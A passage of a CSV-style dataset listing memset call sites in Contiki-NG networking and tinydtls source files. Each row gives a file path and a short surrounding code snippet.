#define ROLL_TM_STATS_INIT() do { memset(&stats, 0, sizeof(stats)); } while(0)
#else /* UIP_MCAST6_STATS */
#define ROLL_TM_STATS_ADD(x)
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,"memset(sl, 0, sizeof(struct sequence_list_header));",120,1,"      iterswptr--) {
    if(SLIDING_WINDOW_IS_USED(iterswptr) && iterswptr->count > 0) {
      memset(sl, 0, sizeof(struct sequence_list_header));
#if ROLL_TM_SHORT_SEEDS
      sl->flags = SEQUENCE_LIST_S_BIT;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,"memset(locmpptr, 0, sizeof(struct mcast_packet));",120,1,"  locswptr->count++;

  memset(locmpptr, 0, sizeof(struct mcast_packet));
  memcpy(&locmpptr->buff, UIP_IP_BUF, uip_len);
  locmpptr->sw = locswptr;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,"memset(windows, 0, sizeof(windows));",120,1,"  PRINTF(""ROLL TM: ROLL Multicast - Draft #%u\n"", ROLL_TM_VER);

  memset(windows, 0, sizeof(windows));
  memset(buffered_msgs, 0, sizeof(buffered_msgs));
  memset(t, 0, sizeof(t));
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,"memset(buffered_msgs, 0, sizeof(buffered_msgs));",120,1,"
  memset(windows, 0, sizeof(windows));
  memset(buffered_msgs, 0, sizeof(buffered_msgs));
  memset(t, 0, sizeof(t));

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,"memset(t, 0, sizeof(t));",120,1,"  memset(windows, 0, sizeof(windows));
  memset(buffered_msgs, 0, sizeof(buffered_msgs));
  memset(t, 0, sizeof(t));

  ROLL_TM_STATS_INIT();
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\uip-mcast6-stats.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\uip-mcast6-stats.c,"memset(&uip_mcast6_stats, 0, sizeof(uip_mcast6_stats));",120,1,"uip_mcast6_stats_init(void *stats)
{
  memset(&uip_mcast6_stats, 0, sizeof(uip_mcast6_stats));
  uip_mcast6_stats.engine_stats = stats;
}
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,"memset(adv_data, 0x00, BLE_ADV_DATA_LEN);",120,1,"{
  uint8_t adv_data_len = 0;
  memset(adv_data, 0x00, BLE_ADV_DATA_LEN);
  /* BLE flags */
  adv_data[adv_data_len++] = 2;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,"memset(scan_resp_data, 0x00, BLE_SCAN_RESP_DATA_LEN);",120,1,"{
  uint8_t scan_resp_data_len = 0;
  memset(scan_resp_data, 0x00, BLE_SCAN_RESP_DATA_LEN);
  /* complete device name */
  scan_resp_data[scan_resp_data_len++] = 1 + strlen(BLE_DEVICE_NAME);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,"memset(&channel->channel_peer, 0x00, sizeof(ble_mac_l2cap_channel_t));",120,1,"  /* parse L2CAP connection data */
  memcpy(&le_psm, &data[3], 2);
  memset(&channel->channel_peer, 0x00, sizeof(ble_mac_l2cap_channel_t));
  memcpy(&channel->channel_peer.cid, &data[5], 2);
  memcpy(&channel->channel_peer.mtu, &data[7], 2);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\ble\ble-l2cap.c,"memset(&resp_data[16], 0x00, 2);",120,1,"  memcpy(&resp_data[14], &channel->channel_own.credits, 2);
  /* result */
  memset(&resp_data[16], 0x00, 2);

  packetbuf_copyfrom((void *)resp_data, 18);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\framer\frame802154.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\framer\frame802154.c,"memset(flen, 0, sizeof(field_length_t));",120,1,"
  /* init flen to zeros */
  memset(flen, 0, sizeof(field_length_t));

  /* Determine lengths of each field based on fcf and other args */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\framer\framer-802154.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\framer\framer-802154.c,"memset(&params, 0, sizeof(params));",120,1,"
  /* init to zeros */
  memset(&params, 0, sizeof(params));

  if(!initialized) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-packet.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-packet.c,"memset(eackbuf_attrs, 0, sizeof(eackbuf_attrs));",120,1,"  }

  memset(eackbuf_attrs, 0, sizeof(eackbuf_attrs));

  tsch_packet_eackbuf_set_attr(PACKETBUF_ATTR_FRAME_TYPE, FRAME802154_ACKFRAME);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-packet.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-packet.c,"memset(&ies, 0, sizeof(ies));",120,1,"
  /* Setup IE timesync */
  memset(&ies, 0, sizeof(ies));
  ies.ie_time_correction = drift;
  ies.ie_is_nack = nack;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-packet.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-packet.c,"memset(ies, 0, sizeof(struct ieee802154_ies));",120,1,"
  if(ies != NULL) {
    memset(ies, 0, sizeof(struct ieee802154_ies));
  }

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-queue.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\tsch-queue.c,"memset(n, 0, sizeof(struct tsch_neighbor));",120,1,"        nbr_table_lock(tsch_neighbors, n);
        /* Initialize neighbor entry */
        memset(n, 0, sizeof(struct tsch_neighbor));
        ringbufindex_init(&n->tx_ringbuf, TSCH_QUEUE_NUM_PER_NEIGHBOR);
        n->is_broadcast = linkaddr_cmp(addr, &tsch_eb_address)
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\sixtop\sixp-pkt.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\sixtop\sixp-pkt.c,"memset(pkt, 0, sizeof(sixp_pkt_t));",120,1,"  }

  memset(pkt, 0, sizeof(sixp_pkt_t));

  /* read the first 4 octets */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\sixtop\sixp-trans.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\mac\tsch\sixtop\sixp-trans.c,"memset(trans, 0, sizeof(sixp_trans_t));",120,1,"    trans->state = SIXP_TRANS_STATE_WAIT_FREE;
  } else {
    memset(trans, 0, sizeof(sixp_trans_t));
    memb_free(&trans_memb, trans);
  }
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,"memset(ipaddr, 0, sizeof(uip_ipaddr_t));",120,1,"set_ip_from_prefix(uip_ipaddr_t *ipaddr, rpl_prefix_t *prefix)
{
  memset(ipaddr, 0, sizeof(uip_ipaddr_t));
  memcpy(ipaddr, &prefix->prefix, (prefix->length + 7) / 8);
  uip_ds6_set_addr_iid(ipaddr, &uip_lladdr);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,"memset(&dag->prefix_info.prefix, 0, sizeof(dag->prefix_info.prefix));",120,1,"    memcpy(&last_prefix, &dag->prefix_info, sizeof(rpl_prefix_t));
  }
  memset(&dag->prefix_info.prefix, 0, sizeof(dag->prefix_info.prefix));
  memcpy(&dag->prefix_info.prefix, prefix, (len + 7) / 8);
  dag->prefix_info.length = len;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,"memset(instance, 0, sizeof(*instance));",120,1,"      instance < end; ++instance) {
    if(instance->used == 0) {
      memset(instance, 0, sizeof(*instance));
      instance->instance_id = instance_id;
      instance->def_route = NULL;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-dag.c,"memset(dag, 0, sizeof(*dag));",120,1,"  for(dag = &instance->dag_table[0], end = dag + RPL_MAX_DAG_PER_INSTANCE; dag < end; ++dag) {
    if(!dag->used) {
      memset(dag, 0, sizeof(*dag));
      dag->used = 1;
      dag->rank = RPL_INFINITE_RANK;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-ext-header.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-ext-header.c,"memset(uip_buf + UIP_IPH_LEN + uip_ext_len, 0, ext_len);",120,1,"  memmove(uip_buf + UIP_IPH_LEN + uip_ext_len + ext_len,
      uip_buf + UIP_IPH_LEN + uip_ext_len, uip_len - UIP_IPH_LEN);
  memset(uip_buf + UIP_IPH_LEN + uip_ext_len, 0, ext_len);

  /* Insert source routing header (as first ext header) */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-ext-header.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-ext-header.c,"memset(UIP_IP_PAYLOAD(0), 0, RPL_HOP_BY_HOP_LEN);",120,1,"  /* Move existing ext headers and payload RPL_HOP_BY_HOP_LEN further */
  memmove(UIP_IP_PAYLOAD(RPL_HOP_BY_HOP_LEN), UIP_IP_PAYLOAD(0), uip_len - UIP_IPH_LEN);
  memset(UIP_IP_PAYLOAD(0), 0, RPL_HOP_BY_HOP_LEN);

  /* Insert HBH header (as first ext header) */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,"memset(&dio, 0, sizeof(dio));",120,1,"  uip_ipaddr_t from;

  memset(&dio, 0, sizeof(dio));

  /* Set default values in case the DIO configuration option is missing. */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,"memset(&buffer[pos], 0, 4);",120,1,"    set32(buffer, pos, dag->prefix_info.lifetime);
    pos += 4;
    memset(&buffer[pos], 0, 4);
    pos += 4;
    memcpy(&buffer[pos], &dag->prefix_info.prefix, 16);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,"memset(&prefix, 0, sizeof(prefix));",120,1,"  prefixlen = 0;
  parent = NULL;
  memset(&prefix, 0, sizeof(prefix));

  uip_ipaddr_copy(&dao_sender_addr, &UIP_IP_BUF->srcipaddr);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl-icmp6.c,"memset(&dao_parent_addr, 0, 16);",120,1,"
  uip_ipaddr_copy(&dao_sender_addr, &UIP_IP_BUF->srcipaddr);
  memset(&dao_parent_addr, 0, 16);

  buffer = UIP_ICMP_PAYLOAD;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-classic\rpl.c,"memset(&rpl_stats, 0, sizeof(rpl_stats));",120,1,"
#if RPL_CONF_STATS
  memset(&rpl_stats, 0, sizeof(rpl_stats));
#endif

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-dag.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-dag.c,"memset(&curr_instance, 0, sizeof(curr_instance));",120,1,"  rpl_of_t *of;

  memset(&curr_instance, 0, sizeof(curr_instance));

  /* OF */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-icmp6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-icmp6.c,"memset(&dao, 0, sizeof(dao));",120,1,"  uip_ipaddr_t from;

  memset(&dao, 0, sizeof(dao));

  dao.instance_id = UIP_ICMP_PAYLOAD[0];
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-icmp6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-icmp6.c,"memset(&dao.parent_addr, 0, 16);",120,1,"
  uip_ipaddr_copy(&from, &UIP_IP_BUF->srcipaddr);
  memset(&dao.parent_addr, 0, 16);

  buffer = UIP_ICMP_PAYLOAD;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-icmp6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl-icmp6.c,"memset(&dao.prefix, 0, sizeof(dao.prefix));",120,1,"        /* Handle the target option. */
        dao.prefixlen = buffer[i + 3];
        memset(&dao.prefix, 0, sizeof(dao.prefix));
        memcpy(&dao.prefix, buffer + i + 4, (dao.prefixlen + 7) / CHAR_BIT);
        break;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\routing\rpl-lite\rpl.c,"memset(&curr_instance.dag.prefix_info.prefix, 0, sizeof(uip_ipaddr_t));",120,1,"
  /* Try and initialize prefix */
  memset(&curr_instance.dag.prefix_info.prefix, 0, sizeof(uip_ipaddr_t));
  memcpy(&curr_instance.dag.prefix_info.prefix, addr, (len + 7) / 8);
  curr_instance.dag.prefix_info.length = len;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-ccm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-ccm.c,"memset((A) + DTLS_CCM_BLOCKSIZE - (L), 0, (L));			\",120,1,"#define SET_COUNTER(A,L,cnt,C) {					\
    int i;								\
    memset((A) + DTLS_CCM_BLOCKSIZE - (L), 0, (L));			\
    (C) = (cnt) & MASK_L(L);						\
    for (i = DTLS_CCM_BLOCKSIZE - 1; (C) && (i > (L)); --i, (C) >>= 8)	\
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-ccm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-ccm.c,"memset(B, 0, DTLS_CCM_BLOCKSIZE);",120,1,"  rijndael_encrypt(ctx, B, X);

  memset(B, 0, DTLS_CCM_BLOCKSIZE);

  if (!la)
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,"memset(handshake, 0, sizeof(*handshake));",120,1,"  }

  memset(handshake, 0, sizeof(*handshake));

  if (handshake) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,"memset(security, 0, sizeof(*security));",120,1,"  }

  memset(security, 0, sizeof(*security));

  if (security) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,"memset(buf, 0, buflen);",120,1,"
  /* Clear the result buffer */
  memset(buf, 0, buflen);
  return dtls_p_hash(HASH_SHA256, 
		     key, keylen, 
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-crypto.c,"memset(p, 0, keylen);",120,1,"  p += sizeof(uint16_t);

  memset(p, 0, keylen);
  p += keylen;

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-hmac.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-hmac.c,"memset(ctx, 0, sizeof(dtls_hmac_context_t));",120,1,"  assert(ctx);

  memset(ctx, 0, sizeof(dtls_hmac_context_t));

  if (klen > DTLS_HMAC_BLOCKSIZE) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-peer.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls-peer.c,"memset(peer, 0, sizeof(dtls_peer_t));",120,1,"  peer = dtls_malloc_peer();
  if (peer) {
    memset(peer, 0, sizeof(dtls_peer_t));
    memcpy(&peer->session, session, sizeof(session_t));
    peer->security_params[0] = dtls_security_new();
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,"memset(cookie + len, 0, *clen - len);",120,1,"
  if (len < *clen) {
    memset(cookie + len, 0, *clen - len);
    *clen = len;
  }
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,"memset(buf, 0, sizeof(uint16_t) + 6); */",120,1,"    security->rseq++;
  } else {
    memset(buf, 0, sizeof(uint16_t) + 6); /* 16 + 48 bits */
    buf += sizeof(uint16_t) + 6; /* 16 + 48 bits */
  }
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,"memset(buf, 0, sizeof(uint16_t));",120,1,"  }

  memset(buf, 0, sizeof(uint16_t));
  return buf + sizeof(uint16_t);
}
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,"memset(psk, 0, DTLS_PSK_MAX_KEY_LEN);",120,1,"    dtls_debug_hexdump(""psk"", psk, len);

    memset(psk, 0, DTLS_PSK_MAX_KEY_LEN);
    if (pre_master_len < 0) {
      dtls_crit(""the psk was too long, for the pre master secret\n"");
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,"memset(nonce, 0, DTLS_CCM_BLOCKSIZE);",120,1,"    }

    memset(nonce, 0, DTLS_CCM_BLOCKSIZE);
    memcpy(nonce, dtls_kb_local_iv(security, peer->role),
	   dtls_kb_iv_size(security, peer->role));
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,"memset(&handshake->keyx.psk, 0, sizeof(dtls_handshake_parameters_psk_t));",120,1,"
    if (len + sizeof(uint16_t) > DTLS_CKXEC_LENGTH) {
      memset(&handshake->keyx.psk, 0, sizeof(dtls_handshake_parameters_psk_t));
      dtls_warn(""the psk identity is too long\n"");
      return dtls_alert_fatal_create(DTLS_ALERT_INTERNAL_ERROR);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\dtls.c,"memset(c, 0, sizeof(dtls_context_t));",120,1,"  }

  memset(c, 0, sizeof(dtls_context_t));
  c->app = app_data;

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\netq.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\netq.c,"memset(node, 0, sizeof(netq_t));",120,1,"
  if (node) {
    memset(node, 0, sizeof(netq_t));
  }

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\ecc\ecc.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\ecc\ecc.c,"memset(A, 0x0, length * sizeof(uint32_t));",120,1,"
static void setZero(uint32_t *A, const int length){
	memset(A, 0x0, length * sizeof(uint32_t));
}

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\ecc\tests\testfield.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\ecc\tests\testfield.c,"memset(temp2, 0, sizeof(temp));",120,1,"void nullEverything(){
	memset(temp, 0, sizeof(temp));
	memset(temp2, 0, sizeof(temp));
}

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\sha2\sha2.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\sha2\sha2.c,"#define MEMSET_BZERO(p,l)	memset((p), 0, (l))",120,1,"
#ifdef SHA2_USE_MEMSET_MEMCPY
#define MEMSET_BZERO(p,l)	memset((p), 0, (l))
#define MEMCPY_BCOPY(d,s,l)	memcpy((d), (s), (l))
#endif
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\sha2\tests\sha2speed.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\sha2\tests\sha2speed.c,"memset(buf, atoi(argv[2]), BUFSIZE);",120,1,"	/* Set up the input data */
	if (argc > 3) {
		memset(buf, atoi(argv[2]), BUFSIZE);
	} else {
		memset(buf, 0xb7, BUFSIZE);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\sha2\tests\sha2speed.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\sha2\tests\sha2speed.c,"memset(buf, 0xb7, BUFSIZE);",120,1,"		memset(buf, atoi(argv[2]), BUFSIZE);
	} else {
		memset(buf, 0xb7, BUFSIZE);
	}

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,"memset(&session, 0, sizeof(session_t));",120,1,"    return -1;

  memset(&session, 0, sizeof(session_t));
  session.size = sizeof(session.addr);
  len = recvfrom(fd, buf, MAX_READ_BUF, 0, 
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,"memset(addrstr, 0, sizeof(addrstr));",120,1,"  int error;

  memset(addrstr, 0, sizeof(addrstr));
  if (server && strlen(server) > 0)
    memcpy(addrstr, server, strlen(server));
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,"memset ((char *)&hints, 0, sizeof(hints));",120,1,"    memcpy(addrstr, ""localhost"", 9);

  memset ((char *)&hints, 0, sizeof(hints));
  hints.ai_socktype = SOCK_DGRAM;
  hints.ai_family = AF_UNSPEC;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-client.c,"memset(&dst, 0, sizeof(session_t));",120,1,"  }
  
  memset(&dst, 0, sizeof(session_t));
  /* resolve destination address where server should be sent */
  res = resolve_address(argv[optind++], &dst.addr.sa);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-server.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\dtls-server.c,"memset(&listen_addr, 0, sizeof(struct sockaddr_in6));",120,1,"  struct sockaddr_in6 listen_addr;

  memset(&listen_addr, 0, sizeof(struct sockaddr_in6));

  /* fill extra field for 4.4BSD-based systems (see RFC 3493, section 3.4) */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\pcap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\pcap.c,"memset(hs_hash, 0, sizeof(hs_hash));",120,1,"  for (i = 0; i < sizeof(hs_hash) / sizeof(dtls_hash_t *); ++i)
    free(hs_hash[i]);
  memset(hs_hash, 0, sizeof(hs_hash));
}

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\pcap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\pcap.c,"memset(security_params, 0, sizeof(security_params));",120,1,"
void init() {
  memset(security_params, 0, sizeof(security_params));
  CURRENT_CONFIG->cipher = -1;

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\secure-server.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\secure-server.c,"memset(&peer, 0, sizeof(peer));",120,1,"
#ifndef NDEBUG
